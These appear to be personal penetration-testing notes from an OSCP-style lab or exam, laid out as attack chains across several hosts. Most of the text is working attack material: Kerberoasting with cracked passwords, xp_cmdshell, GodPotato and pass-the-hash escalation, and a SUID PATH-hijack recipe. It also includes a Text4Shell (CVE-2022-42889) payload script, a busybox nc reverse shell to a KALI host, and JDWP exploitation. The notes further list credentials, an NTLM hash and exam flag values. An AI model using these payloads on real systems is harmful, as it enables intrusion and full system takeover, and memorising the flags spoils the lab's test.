  -> Chisel SOCKS pivot (socks5 127.0.0.1:1080)
  -> Kerberoast -> sql_svc:Dolphin1 + web_svc:Diamond1
  -> mssqlclient sql_svc@10.10.43.148 -windows-auth -> xp_cmdshell
  -> SeImpersonatePrivilege MS02
  -> Files via MS01 IIS (C:\inetpub\wwwroot) -> MS01.oscp.exam:8080
  -> GodPotato MS02 -> hacker user -> evil-winrm MS02
  -> windows.old SAM -> tom_admin:4979d69d4ca66955c075c41cf45f24dc
  -> PtH tom_admin -> DC01 proof.txt: a0178d15e46e8a85b09cd102f8606bf6
```

**Key lessons:**
- IIS requires FQDN not IP: MS01.oscp.exam:8080
- xp_cmdshell CreateProcess error = spaces in path, use C:\Windows\Temp\
- proxychains must use socks5 not socks4
- windows.old SAM hives = old domain user hashes

---

### .149 Kiero Attack Chain
```
SNMP community: public
  -> snmpwalk NET-SNMP-EXTEND-MIB::nsExtendObjects
  -> RESET_PASSWD at /home/john/RESET_PASSWD (SUID root)
  -> calls chpasswd WITHOUT full path = PATH hijack vuln
  -> FTP kiero:kiero -> id_rsa, id_rsa_2, id_rsa.pub
  -> ssh -i id_rsa john@.149 -> john shell -> local.txt: 36e84227b16794ea6ebbc198076fda87
  -> PATH hijack:
       echo '#!/bin/bash' > /tmp/chpasswd
       echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/chpasswd
       chmod +x /tmp/chpasswd && export PATH=/tmp:$PATH
       ~/RESET_PASSWD
  -> /tmp/rootbash -p -> root -> proof.txt: a8a657f114ced5128275e8f2bcabe559
```

---

### .150 Berlin Attack Chain (CVE-2022-42889 Text4Shell + JDWP)
```
/CHANGELOG confirms Apache Commons Text 1.8 -> CVE-2022-42889
  -> busybox nc payload with %25 suffix:
     curl "http://IP:8080/search?query=ENCODED_PAYLOAD%25"
     payload: dollar{script:javascript:java.lang.Runtime.getRuntime().exec('busybox nc KALI 4444 -e sh')}
  -> shell as dev -> local.txt: 1cd4c6b0adc1dc7372f063498aae2eb0
  -> JDWP: root runs java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y
  -> SSH tunnel from target: ssh -f -N -R 8000:localhost:8000 kali@KALI_IP
  -> Kali: python2 46501.py -t 127.0.0.1 -p 8000 --cmd 'busybox nc KALI 9999 -e sh'
  -> Target: nc 127.0.0.1 5000 (triggers JDWP breakpoint event)
  -> Kali nc -lvnp 9999 catches root shell
  -> proof.txt: b1ee7bebc52e78383f77f7697cecdb73
```

**Key lessons:**
- Use busybox nc NOT regular nc for Text4Shell
- Add %25 (encoded %) suffix to payload URL
- Two-step download+execute does NOT work, use direct nc command
- JDWP 46501.py requires python2
- SSH tunnel port 8000 to Kali first (only listens locally)
- Connect nc to port 5000 AFTER exploit is waiting to trigger breakpoint

---

### .151 FreeSWITCH Attack Chain
```
FreeSWITCH mod_event_socket port 8021, password: ClueCon
  -> python3 freeswitch.py IP "whoami" -> oscp\chris
  -> local.txt: ddbb601c7861ae9f8beb17d48ee85136
  -> SeImpersonatePrivilege
  -> certutil download GodPotato-NET4.exe + nc.exe
  -> GodPotato reverse shell -> SYSTEM
  -> proof.txt: c6999995cc45c3f47582ac7703dd6a9f
```

---

### Text4Shell Quick Reference (CVE-2022-42889)
```python
from urllib.parse import quote
import requests

url = "http://TARGET:8080/search"
cmd = "busybox nc KALI 4444 -e sh"
payload = "${script:javascript:java.lang.Runtime.getRuntime().exec('" + cmd + "')}"
encoded = quote(payload, safe='')
requests.get(f"{url}?query={encoded}%25")
```

### JDWP Privesc Quick Reference (EDB 46501)
```bash
# 1. Target - SSH tunnel:
ssh -f -N -R 8000:localhost:8000 kali@KALI_IP

# 2. Kali - listener:
nc -lvnp 9999

# 3. Kali - run exploit (python2 required):
python2 46501.py -t 127.0.0.1 -p 8000 --cmd 'busybox nc KALI 9999 -e sh'
# waits for: [+] Waiting for an event on 'java.net.ServerSocket.accept'

# 4. Target - trigger event:
nc 127.0.0.1 5000
```

### PATH Hijack Quick Reference (SUID)
```bash
echo '#!/bin/bash' > /tmp/TARGET_CMD
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/TARGET_CMD
chmod +x /tmp/TARGET_CMD
export PATH=/tmp:$PATH
/path/to/SUID_BINARY
/tmp/rootbash -p
```
